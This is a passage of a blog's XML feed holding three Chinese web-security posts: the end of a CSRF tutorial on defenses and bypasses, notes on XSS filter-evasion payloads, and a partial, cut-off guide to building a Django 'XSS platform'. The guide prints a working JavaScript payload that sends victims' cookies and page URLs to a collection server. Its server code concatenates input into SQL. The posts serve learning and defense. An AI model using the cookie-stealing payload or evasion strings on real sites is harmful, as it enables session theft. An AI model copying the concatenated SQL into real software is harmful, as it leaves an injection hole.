rel="noopener">从零开始学CSRF</a><br><a href="https://xz.aliyun.com/t/1673" target="_blank" rel="noopener">Web安全系列 – Csrf漏洞</a><br><a href="https://xz.aliyun.com/t/2384" target="_blank" rel="noopener">phpMyAdmin 4.7.x CSRF 漏洞利用</a>  </p><h2 id="0x06-防御CSRF攻击"><a href="#0x06-防御CSRF攻击" class="headerlink" title="0x06 防御CSRF攻击"></a>0x06 防御CSRF攻击</h2><p>&#160;&#160;&#160;&#160;前边我们说到，产生CSRF的原因主要有两点，那么我们可以针对这两点进行相应的防御。</p><h3 id="1-Token"><a href="#1-Token" class="headerlink" title="1) Token"></a>1) Token</h3><p>&#160;&#160;&#160;&#160;我们知道CSRF攻击的请求除了Cookie以外，其他的内容必须提前确定好，那么如果我们在服务端要求提交的某一个参数中是随机的值呢？<br>&#160;&#160;&#160;&#160;这里我们称这个随机的、无法被预计的值叫做Token，一般是由服务端在接收到用户端请求后生成，返回给用户的Token通常放置在<strong>hidden</strong>表单或用户的<strong>Cookie</strong>里。<br>&#160;&#160;&#160;&#160;当用户打开正常的发送请求的页面时，服务器会生成一串随机的Token值给浏览器，在发送请求时带上此Token，服务端验证Token值，如果相匹配才执行相应的操作、<strong>销毁</strong>原Token以及生成并返回<strong>新</strong>的Token给用户，这样做不仅仅起到了<strong>防御CSRF</strong>的作用，还可以防止<strong>表单的重复提交</strong>。<br>&#160;&#160;&#160;&#160;由于HTML标签产生的合法跨域只能是单向请求，无法通过CSRF直接取返回的内容，所以我们无法使用CSRF先取Token值再构造请求，这使得Token可以起到防御CSRF的作用。<br>&#160;&#160;&#160;&#160;注意Token不应该放置在网页的<strong>Url</strong>中，如果放在Url中当浏览器自动访问外部资源，如img标签的src属性指向攻击者的服务器，Token会出现作为<strong>Referer</strong>发送给外部服务器，以下为相关实例：  </p><ul><li>WooYun-2015-136903</li></ul><h3 id="2-Referer"><a href="#2-Referer" class="headerlink" title="2) Referer"></a>2) Referer</h3><p>&#160;&#160;&#160;&#160;前边我们提到，CSRF伪造的请求与用户正常的请求相比最大的区别就是请求头中的<strong>Referer值</strong>不同，使用我们可以根据这点来防御CSRF。<br>&#160;&#160;&#160;&#160;在接收请求的服务端判断请求的Referer头是否为正常的发送请求的页面，如果不是，则进行拦截。<br>&#160;&#160;&#160;&#160;不过此方法有时也存在着一定的漏洞，比如可绕过等，所以最好还是使用Token。<br>&#160;&#160;&#160;&#160;判断Referer的一般方法就是利用正则进行判断，而判断Referer的正则一定要写全，不然就会如上所说，可绕过！曾经的Wooyun上就有许多CSRF的漏洞是由于Referer的正则不规范导致。<br>&#160;&#160;&#160;&#160;比如<code>^http\:\/\/a\.com</code>，只验证了是否Referer是否以<code>http://a.com</code>开头，可是没想到我们可以在自己的顶级域名添加一个子域名<code>http://a.com.hacker.com</code>；还有<code>http\:\/\/a\.com\/</code>，通过<code>http://hacker.com/?http://a.com/</code>绕过。以下相关例子均为Referer绕过：</p><ul><li>WooYun-2015-164067</li><li>WooYun-2015-165578</li><li>WooYun-2016-166608</li><li>WooYun-2016-167674</li></ul><p>&#160;&#160;&#160;&#160;有些网站由于历史原因会允许空Referer头，当https向http进行跳转时，使用Html标签(如img、iframe)进行CSRF攻击时，请求头是不会带上Referer的，可以达到空Referer的目的。<br><img src="https://i.loli.net/2019/03/26/5c9a1fd975b72.png" alt=""></p><h3 id="3-验证码"><a href="#3-验证码" class="headerlink" title="3) 验证码"></a>3) 验证码</h3><p>&#160;&#160;&#160;&#160;在发送请求前先需要输入基于服务端判断的验证码，机制与Token类似，防御CSRF效果非常好，不过此方法对用户的友好度很差。  </p><h3 id="4-关注点"><a href="#4-关注点" class="headerlink" title="4) 关注点"></a>4) 关注点</h3><p>&#160;&#160;&#160;&#160;关于CSRF的防护应首先关注高危操作的请求，比如:<strong>网上转账</strong>、<strong>修改密码</strong>等，其次应重点关注那些可以散播的，比如：<strong>分享链接</strong>、<strong>发送消息</strong>等，再者是能辅助散播的，如<strong>取用户好友信息</strong>等，因为前者加上后者制造出来的CSRF蠕虫虽不如XSS蠕虫威力大，可是也不可小觑。最后应关注那些高权限账户能够进行的<strong>特权操作</strong>，如：<strong>上传文件</strong>、<strong>添加管理员</strong>，在许多渗透测试中，便是起初利用这点一撸到底。</p><h3 id="5-防御实例：Django的CSRF防御机制"><a href="#5-防御实例：Django的CSRF防御机制" class="headerlink" title="5) 防御实例：Django的CSRF防御机制"></a>5) 防御实例：Django的CSRF防御机制</h3><p>&#160;&#160;&#160;&#160;新建个Django项目，打开项目下的<strong>settings.py</strong>文件，可以看到这么一行代码：<code>django.middleware.csrf.CsrfViewMiddleware</code><br><img src="https://i.loli.net/2019/03/26/5c99fa7461ff7.png" alt=""><br>这个就是Django的CSRF防御机制，当我们发送POST请求时Django会自动检测CSRF_Token值是否正确。我们把<code>Debug</code>打开，可以看到如果我们的POST请求无CSRF_Token这个值，服务端会返回403报错。<br><img src="https://i.loli.net/2019/03/26/5c99fb81dcc5c.png" alt=""><br>现在我们往表单上添加CSRF_Token的验证：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Title&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form action=&quot;/login/&quot; method=&quot;post&quot;&gt;</span><br><span class="line">        &#123;% raw %&#125;&#123;&#123;% endraw %&#125;% csrf_token %&#125; //添加Token</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;user&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;pwd&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;登陆&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>下图为生成的HTML，可以看到<code>{% csrf_token %}</code>这串代码被Django解析成了一个隐藏的<code>input</code>标签，其中的值为token值，当我们发送请求时必须带上这个值。<br><img src="https://i.loli.net/2019/03/26/5c99fdf9b1817.png" alt=""><br>只有这样Django才会接受POST请求来的数据，否则返回错误，并且原登陆页面的CSRF_Token重新生成，上一个进行销毁，很大程度上防御住了POST请求的CSRF。<br><img src="https://i.loli.net/2019/03/26/5c9a015bb3235.png" alt=""></p><p>补充一张暴漫系列图，引用自先知社区《聊聊CSRF漏洞攻防—-久等的暴漫》作者：<strong>farmsec</strong>：<br><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20171228123105-eb36ca20-eb87-1.png" alt=""></p><h2 id="0x07-CSRF的常用检测方法"><a href="#0x07-CSRF的常用检测方法" class="headerlink" title="0x07 CSRF的常用检测方法"></a>0x07 CSRF的常用检测方法</h2><h3 id="1-黑盒"><a href="#1-黑盒" class="headerlink" title="1) 黑盒"></a>1) 黑盒</h3><ul><li>首先肯定确定<strong>是否除Cookie外其他参数均可确定，即：无验证码，无Token等</strong>。</li><li>再者如果发现是<strong>Referer头判断</strong>的话，可以尝试是否可以绕过正则。</li><li>还有就是考虑能不能绕过Token，比如Url处的Token用加载攻击者服务器上的图片来获取。</li><li>最后可以考虑与XSS结合，如：攻击者使用iframe跨域，存在xss漏洞的网站插入的XSS执行代码为<code>eval(window.name)</code>，那么我们构造的iframe标签里可以添加个name属性与子页面进行通信，例子：wooyun-2015-089971。</li></ul><h3 id="2-白盒"><a href="#2-白盒" class="headerlink" title="2) 白盒"></a>2) 白盒</h3><ul><li>查看是否有Token，验证码，Referer等不确定参数判断。</li><li>判断Referer的正则是否安全。</li><li>判断Token返回的位置是否为安全位置。</li><li>判断生成的Token是否足够随机，毫无规律。</li></ul><p><em>从上到下挖掘难度依次递增</em></p><h2 id="0x08-补充说明"><a href="#0x08-补充说明" class="headerlink" title="0x08 补充说明"></a>0x08 补充说明</h2><h3 id="1-HttpOnly"><a href="#1-HttpOnly" class="headerlink" title="1) HttpOnly"></a>1) HttpOnly</h3><p>&#160;&#160;&#160;&#160;CSRF攻击不受Cookie的<strong>HttpOnly</strong>属性影响。<br><img src="https://i.loli.net/2019/03/26/5c9a0543ebef5.png" alt=""></p><h3 id="2-XSS漏洞情况下的CSRF"><a href="#2-XSS漏洞情况下的CSRF" class="headerlink" title="2) XSS漏洞情况下的CSRF"></a>2) XSS漏洞情况下的CSRF</h3><p>&#160;&#160;&#160;&#160;如果一个网站存在XSS漏洞，那么以上针对CSRF的防御几乎失去了作用。</p><h3 id="3-关于Flash的内容"><a href="#3-关于Flash的内容" class="headerlink" title="3) 关于Flash的内容"></a>3) 关于Flash的内容</h3><p>&#160;&#160;&#160;&#160;鉴于Flash的凉势，这里暂不做研究以节省时间。  </p><h3 id="4-目前CSRF形势"><a href="#4-目前CSRF形势" class="headerlink" title="4) 目前CSRF形势"></a>4) 目前CSRF形势</h3><p>&#160;&#160;&#160;&#160;就目前而言，CSRF这个沉睡的巨人颇有一番苏醒的意味，可导致的危害也正在逐步的为人们所知，但目前仍有许多开发人员还没有足够的安全意识，以为只要验证Cookie就能确定用户的真实意图了，这就导致了目前仍有大量潜在的CSRF漏洞的局面，CSRF是不可小觑的漏洞，希望大家看完这篇文章能对CSRF有个较为清晰的认识。</p><h2 id="0x09-结束语"><a href="#0x09-结束语" class="headerlink" title="0x09 结束语"></a>0x09 结束语</h2><p>&#160;&#160;&#160;&#160;这是我在信安之路投稿的第二篇文章，虽说内容较为基础，但也是我熟读几本相关书籍与相关文章、研究已知漏洞，所写出来的一篇半总结，半思考文章，也许里边会有些错误，麻烦各位表哥斧正，如果有想要与我交流相关内容的可以email我(asp-php#foxmail.com #换成@)。<br>&#160;&#160;&#160;&#160;最后欢迎大家多多投稿呀，真的能对自己的学习有很大帮助！</p><h2 id="0x0A-参考"><a href="#0x0A-参考" class="headerlink" title="0x0A 参考"></a>0x0A 参考</h2><p>书籍：<br><strong>《Web前端黑客技术揭秘》p83-p96<br>《XSS跨站脚本攻击剖析与防御》p182-p187<br>《黑客攻防技术宝典Web实战篇第二版》p368-p374</strong><br>文章:<br><a href="https://xz.aliyun.com/t/240" target="_blank" rel="noopener">CSRF漏洞挖掘</a><br><a href="https://blog.csdn.net/sum_rain/article/details/37085771" target="_blank" rel="noopener">WEB安全之Token浅谈</a><br><a href="https://xz.aliyun.com/t/4470" target="_blank" rel="noopener">跨域方式及其产生的安全问题</a><br><a href="https://blog.csdn.net/qq_41000891/article/details/82784489" target="_blank" rel="noopener">Django中CSRF原理及应用详解</a><br><a href="https://drops.secquan.org/papers/155" target="_blank" rel="noopener">CSRF简单介绍及利用方法 | WooYun知识库</a><br><a href="https://blog.csdn.net/liwb94/article/details/80221224" target="_blank" rel="noopener">原生JSONP实现_动态加载js（利用script标签）</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x01-CSRF简介&quot;&gt;&lt;a href=&quot;#0x01-CSRF简介&quot; class=&quot;headerlink&quot; title=&quot;0x01 CSRF简介&quot;&gt;&lt;/a&gt;0x01 CSRF简介&lt;/h2&gt;&lt;p&gt;&amp;#160;&amp;#160;&amp;#160;&amp;#160;CSRF，也称XSRF，即跨站请求伪造攻击，与XSS相似，但与XSS相比更难防范，是一种广泛存在于网站中的安全漏洞，经常与XSS一起配合攻击。&lt;br&gt;
    
    </summary>
    
      <category term="原创栏目" scheme="http://www.0x002.com/categories/%E5%8E%9F%E5%88%9B%E6%A0%8F%E7%9B%AE/"/>
    
    
      <category term="CSRF" scheme="http://www.0x002.com/tags/CSRF/"/>
    
  </entry>
  
  <entry>
    <title>关于我学XSS躺过的那些坑</title>
    <link href="http://www.0x002.com/2019/%E5%85%B3%E4%BA%8E%E6%88%91%E5%AD%A6XSS%E8%BA%BA%E8%BF%87%E7%9A%84%E9%82%A3%E4%BA%9B%E5%9D%91/"/>
    <id>http://www.0x002.com/2019/关于我学XSS躺过的那些坑/</id>
    <published>2019-03-22T16:29:00.000Z</published>
    <updated>2019-03-25T16:41:01.193Z</updated>
    
    <content type="html"><![CDATA[<h1 id="XSS字符编码"><a href="#XSS字符编码" class="headerlink" title="XSS字符编码"></a>XSS字符编码</h1><p>在学习编码绕过时由于数量多，类型相似，不太容易记得住，记得全，故做此记录。<br><a id="more"></a></p><h2 id="0x01-Html标签属性中执行"><a href="#0x01-Html标签属性中执行" class="headerlink" title="0x01 Html标签属性中执行"></a>0x01 Html标签属性中执行</h2><p>简单了解：</p><blockquote><p>Html标签属性中的XSS问题多属于javascript伪协议<br>常见的属性有：  </p><ul><li>src</li><li>lowsrc</li><li>dynsrc</li><li>url</li><li>href</li><li>action</li><li>onload</li><li>onunload</li><li>onmouseover</li><li>onerror</li><li>各种on开头的事件  </li></ul></blockquote><blockquote><p>PS：此处可不加括号，如<code>onclick=javascript:alert(1)</code>,各类教程里常见的<code>&lt;img src=javascript:alert(1)&gt;&lt;/img&gt;</code>Chrome、Firfox已失效，IE测试成功。</p></blockquote><p><strong>在Html标签中，许多标签具有执行javascript的权利，当服务器存在过滤时，我们可以尝试通过以下编码方法绕过：</strong></p><ul><li>8/10/16进制转换(<code>[.][&amp;#][&amp;#x]</code>)</li><li>利用<code>javascript:String.fromCharCode(xx,xx,xx......)</code> <strong>[xx为编码的字符串的ASCII码]</strong></li><li>JScript Encode <strong>[IE]</strong>  JS fuck等</li><li><code>data:text/html;bbase64,xxxxxxx</code> <strong>[IE下无效，Chorme、Firefox下均属于空白域，无法获取信息，不过可用作CVE攻击]</strong></li></ul><h2 id="0x02-在-lt-script-gt-lt-script-gt-中"><a href="#0x02-在-lt-script-gt-lt-script-gt-中" class="headerlink" title="0x02 在&lt;script&gt;&lt;/script&gt;中"></a>0x02 在&lt;script&gt;&lt;/script&gt;中</h2><blockquote><p>直接在script标签里执行的情况，我们通常分为以下几种利用方式：  </p><ul><li>直接导入远程XSS平台脚本</li><li>直接在<code>&lt;&gt;&lt;/&gt;</code>中写上自定义攻击脚本，如生成img标签</li></ul></blockquote><p>关于<code>&lt;&gt;&lt;/&gt;</code>中可用： </p><h3 id="1-单个拆开编码成ASCII"><a href="#1-单个拆开编码成ASCII" class="headerlink" title="1) 单个拆开编码成ASCII"></a>1) 单个拆开编码成ASCII</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(String.fromCharCode())</span><br></pre></td></tr></table></figure><h3 id="2-使用eval-执行16进制转换后的代码"><a href="#2-使用eval-执行16进制转换后的代码" class="headerlink" title="2) 使用eval()执行16进制转换后的代码"></a>2) 使用eval()执行16进制转换后的代码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">eval(\u0064\u0078......)</span><br><span class="line">eval(\x64\x78......)</span><br></pre></td></tr></table></figure><h2 id="0x03-在样式表中的编码"><a href="#0x03-在样式表中的编码" class="headerlink" title="0x03 在样式表中的编码"></a>0x03 在样式表中的编码</h2><p>样式表中可用expression和@import来执行js代码,此方法可进行适当的编码转换。<br>PS:仅在IE8.0之前的版本。</p><h3 id="1-expression"><a href="#1-expression" class="headerlink" title="1) expression"></a>1) expression</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">全角字符：</span><br><span class="line">&lt;div style=xss:ｅｘｐｒｅｓｓｉｏｎ(alert(1))&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">十六进制</span><br><span class="line">&lt;div style=xss:\0065ｘｐｒｅｓｓｉｏｎ(alert(1))&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/**/注释 [Javascript中也行]</span><br><span class="line">&lt;div sty/**/le=x/**/ss:\0065ｘｐｒｅ/**/ｓｓｉｏ/**/ｎ(al/**/ert(1))&gt;</span><br></pre></td></tr></table></figure><h3 id="2-import"><a href="#2-import" class="headerlink" title="2) @import"></a>2) @import</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\和结束符\0会被浏览器忽略</span><br><span class="line">@im\po\rt jav\ascr\ipt:al\ert(1)</span><br><span class="line">@im\00po\0rt jav\00asc\0000ript:a\00lert(1)</span><br></pre></td></tr></table></figure><hr><h1 id="浏览器差异"><a href="#浏览器差异" class="headerlink" title="浏览器差异"></a>浏览器差异</h1><p>简单记录常见的浏览器差异造成的XSS  </p><h2 id="0x01-引号的差异"><a href="#0x01-引号的差异" class="headerlink" title="0x01 引号的差异"></a>0x01 引号的差异</h2><p>只有IE支持反引号<code></code> `</p><h2 id="0x02-标签的差异"><a href="#0x02-标签的差异" class="headerlink" title="0x02 标签的差异"></a>0x02 标签的差异</h2><ul><li>data协议执行代码是在Chrome下执行</li><li>Chrome下srcdoc利用：<code>&lt;iframe srcdoc=&quot;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;&lt;/iframe&gt;</code></li><li>IE下<code>&lt;img src=javascript:alert(1)&gt;</code></li><li>只要火狐支持E4X</li></ul><h2 id="0x03-过滤器差异"><a href="#0x03-过滤器差异" class="headerlink" title="0x03 过滤器差异"></a>0x03 过滤器差异</h2><p>Chrome能拦截大多数反射型XSS，Firefox次之，IE最次</p><h1 id="浏览器异常解析BUG产生XSS漏洞"><a href="#浏览器异常解析BUG产生XSS漏洞" class="headerlink" title="浏览器异常解析BUG产生XSS漏洞"></a>浏览器异常解析BUG产生XSS漏洞</h1><p><img src="https://i.loli.net/2019/03/23/5c964e6f476d6.jpg" alt=""></p><h1 id="关于调用document"><a href="#关于调用document" class="headerlink" title="关于调用document"></a>关于调用document</h1><p>在刚开始学习XSS的时候总是想千方百计的想用javascript调用dom对象，比如document.cookie，却不知这个只能在javascript域[伪协议或<script></script>标签内]范围内。</p><h1 id="小知识点"><a href="#小知识点" class="headerlink" title="小知识点"></a>小知识点</h1><p><strong>一、src等属性在引入时如果漏洞网站协议名于xss平台相同，即可省略去，如：<code>&lt;img src=//www.baidu.com /&gt;</code></strong><br><strong>二、svg标签属于xml而不属于html</strong><br><strong>三、关于Cors跨域：使用Ajax跨域时默认是不允许带上会话数据的，不过可以在XSS平台通过设置返回的请求头<code>Access-Control-Allow-Credentials: true</code>，并且需要设置xhr的<code>withCreadential</code>属性值为true，注意此时返回的<code>Access-Control-Allow-Origin</code>不能设置为通配符true。</strong><br><strong>四、优先级：<code>function xxx(){}形式定义的函数 -&gt; == -&gt; &amp;</code></strong><br><strong>五、使用img等合法标签跨域可以带上会话信息</strong><br><strong>六、除javascript外还有vbscript、actionscript等</strong><br><strong>七、P3P协议仅仅是IE浏览器支持,通常是Hacker域名通过iframe或script等载入存在XSS漏洞的网站</strong>  </p><h1 id="与CSRF的区别"><a href="#与CSRF的区别" class="headerlink" title="与CSRF的区别"></a>与CSRF的区别</h1><p>XSS的恶意请求伪造与CSRF极为相似，两者的差别为：</p><ul><li>后者发出的伪造请求可为其他站点发出的，而前者都是存在XSS漏洞的站点发出的</li><li>CSRF是XSS无法替代的</li><li>CSRF可以无Javascript参与，及在黑客的网站上使用img等标签发送带Cookie(自带)的跨域请求。</li></ul><h1 id="关于XSS防御"><a href="#关于XSS防御" class="headerlink" title="关于XSS防御"></a>关于XSS防御</h1><h2 id="0x01-输出Html标签属性"><a href="#0x01-输出Html标签属性" class="headerlink" title="0x01 输出Html标签属性"></a>0x01 输出Html标签属性</h2><p>如：<code>&lt;input class=&#39;xxx&#39; value=&quot;{输出}&quot;&gt;</code> 这里的输出如果过滤/转义了<code>&quot;</code>，便不存在XSS漏洞了，因为这里的value属性不能执行js代码。   </p><h2 id="0x02-输出在注释"><a href="#0x02-输出在注释" class="headerlink" title="0x02 输出在注释"></a>0x02 输出在注释</h2><p>一定要过滤换行符！！</p><h2 id="0x03-输出在样式表"><a href="#0x03-输出在样式表" class="headerlink" title="0x03 输出在样式表"></a>0x03 输出在样式表</h2><p>过滤expression和@import还有外部图片的引用</p><h2 id="0x04-字符集"><a href="#0x04-字符集" class="headerlink" title="0x04 字符集"></a>0x04 字符集</h2><p>开头设定好字符集为 UTF-8</p><h2 id="0x05-Cookie盗取"><a href="#0x05-Cookie盗取" class="headerlink" title="0x05 Cookie盗取"></a>0x05 Cookie盗取</h2><p>设置好path、开启http_only、防止调试信息泄露和Apache400漏洞、使用Session</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;XSS字符编码&quot;&gt;&lt;a href=&quot;#XSS字符编码&quot; class=&quot;headerlink&quot; title=&quot;XSS字符编码&quot;&gt;&lt;/a&gt;XSS字符编码&lt;/h1&gt;&lt;p&gt;在学习编码绕过时由于数量多，类型相似，不太容易记得住，记得全，故做此记录。&lt;br&gt;
    
    </summary>
    
      <category term="原创栏目" scheme="http://www.0x002.com/categories/%E5%8E%9F%E5%88%9B%E6%A0%8F%E7%9B%AE/"/>
    
    
      <category term="XSS" scheme="http://www.0x002.com/tags/XSS/"/>
    
      <category term="个人笔记" scheme="http://www.0x002.com/tags/%E4%B8%AA%E4%BA%BA%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>使用Django简单编写一个XSS平台</title>
    <link href="http://www.0x002.com/2019/%E4%BD%BF%E7%94%A8Django%E6%89%93%E9%80%A0%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84XSS%E5%B9%B3%E5%8F%B0/"/>
    <id>http://www.0x002.com/2019/使用Django打造属于自己的XSS平台/</id>
    <published>2019-03-20T04:00:00.000Z</published>
    <updated>2019-03-20T17:06:07.890Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-简要描述"><a href="#1-简要描述" class="headerlink" title="1) 简要描述"></a>1) 简要描述</h1><p>&#160; &#160; &#160; &#160;原理十分简单2333,代码呆萌,大牛勿喷 &gt;_&lt;<br><a id="more"></a></p><h1 id="2-基础知识"><a href="#2-基础知识" class="headerlink" title="2) 基础知识"></a>2) 基础知识</h1><ul><li>XSS攻击基本原理和利用方法</li><li>Django框架的使用</li></ul><h1 id="3-Let’s-start"><a href="#3-Let’s-start" class="headerlink" title="3) Let’s start"></a>3) Let’s start</h1><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>&#160; &#160; &#160; &#160;工欲善其事必先利其器，首先我们需要准备编写代码的各种工具和环境，这里不细说。我这里的环境和工具如下：</p><ul><li>python 3.7.0</li><li>pycharm</li><li>windows 10</li><li>mysql 8.0.15</li><li>Django 2.1.3  </li></ul><p>&#160; &#160; &#160; &#160;需要用到的第三方库：</p><ul><li>django</li><li>pymysql</li><li>requests</li></ul><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>&#160; &#160; &#160; &#160;我们先看一下XSS脚本是如何工作的  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var website=&quot;http://127.0.0.1&quot;;</span><br><span class="line">(function()&#123;(new Image()).src=website+&apos;/?keepsession=1&amp;location=&apos;+escape((function()&#123;try&#123;return document.location.href&#125;catch(e)&#123;return&apos;&apos;&#125;&#125;)())+&apos;&amp;toplocation=&apos;+escape((function()&#123;try&#123;return top.location.href&#125;catch(e)&#123;return&apos;&apos;&#125;&#125;)())+&apos;&amp;cookie=&apos;+escape((function()&#123;try&#123;return document.cookie&#125;catch(e)&#123;return&apos;&apos;&#125;&#125;)())+&apos;&amp;opener=&apos;+escape((function()&#123;try&#123;return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:&apos;&apos;&#125;catch(e)&#123;return&apos;&apos;&#125;&#125;)());&#125;)();</span><br></pre></td></tr></table></figure><p>&#160; &#160; &#160; &#160;这段代码非常简单，就是通过javascript获取有用信息，然后通过访问xss平台将信息作为GET参数传给服务器。<br>&#160; &#160; &#160; &#160;注意：这里使用AJAX可能会出现CORS跨域问题。  </p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>&#160; &#160; &#160; &#160;先给出关键代码，其他都是Django相关的内容，这里不做相关讨论。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&quot;&quot;&quot;</span><br><span class="line">根据url值动态返回相应的javascript代码</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">import pymysql,os</span><br><span class="line">from user.safeio import re_check</span><br><span class="line"></span><br><span class="line">def get_info(url):</span><br><span class="line">    if not re_check(url,&apos;num_letter&apos;):</span><br><span class="line">        return &apos;default&apos;</span><br><span class="line">    db = pymysql.connect(&apos;localhost&apos;,&apos;root&apos;,&apos;root&apos;,&apos;xss&apos;)</span><br><span class="line">    cursor = db.cursor()</span><br><span class="line">    cursor.execute(&quot;Select name From projects Where url=&apos;&quot;+url+&quot;&apos;&quot;)</span><br><span class="line">    js_name = cursor.fetchone()[0]</span><br><span class="line">    if js_name == None:</span><br><span class="line">        return &apos;default&apos;</span><br><span class="line">    else:</span><br><span class="line">        return (js_name)</span><br><span class="line"></span><br><span class="line">def get_js_value(url):</span><br><span class="line">    js_name = get_info(url)</span><br><span class="line">    file = &apos;\\script\\&apos;+js_name + &apos;.js&apos;</span><br><span class="line">    js_value = open(os.getcwd()+file).read()</span><br><span class="line">    js_value = js_value.replace(&apos;&lt;-1234-&gt;&apos;,url)</span><br><span class="line">    return js_value</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">import pymysql,time</span><br><span class="line">from .getscript import get_info</span><br><span class="line"></span><br><span class="line">def connect():</span><br><span class="line">    try:</span><br><span class="line">        db = pymysql.connect(&apos;localhost&apos;, &apos;root&apos;, &apos;root&apos;, &apos;xss&apos;)</span><br><span class="line">        cursor = db.cursor()</span><br><span class="line">        return db,cursor</span><br><span class="line">    except:</span><br><span class="line">        print(&apos;连接数据库失败，正在尝试重新连接&apos;)</span><br><span class="line">        connect()</span><br><span class="line"></span><br><span class="line">def put_letter(requests,url):</span><br><span class="line">    now_time = time.strftime(&apos;%Y-%m-%d %H:%M:%S&apos;,time.localtime(time.time()))[2:]</span><br><span class="line">    if &apos;HTTP_X_FORWARDED_FOR&apos; in requests.META:</span><br><span class="line">        ip = requests.META[&apos;HTTP_X_FORWARDED_FOR&apos;]</span><br><span class="line">    else:</span><br><span class="line">        try:</span><br><span class="line">            ip = requests.META[&apos;REMOTE_ADDR&apos;]</span><br><span class="line">        except:</span><br><span class="line">            ip = &apos;0.0.0.0&apos;</span><br><span class="line">    ip = ip.replace(&quot;&apos;&quot;,&quot;\&apos;&quot;)</span><br><span class="line">    origin = requests.GET.get(&apos;location&apos;,&apos;Unknown&apos;).replace(&quot;&apos;&quot;,&quot;\&apos;&quot;)</span><br><span class="line">    software = requests.META.get(&apos;HTTP_USER_AGENT&apos;,&apos;Unknown&apos;).replace(&quot;&apos;&quot;,&quot;\&apos;&quot;)</span><br><span class="line">    method = requests.method.replace(&quot;&apos;&quot;,&quot;\&apos;&quot;)</span><br><span class="line">    data = requests.GET.get(&apos;cookie&apos;,&apos;No data&apos;).replace(&quot;&apos;&quot;,&quot;\&apos;&quot;)</span><br><span class="line">    keep_alive = 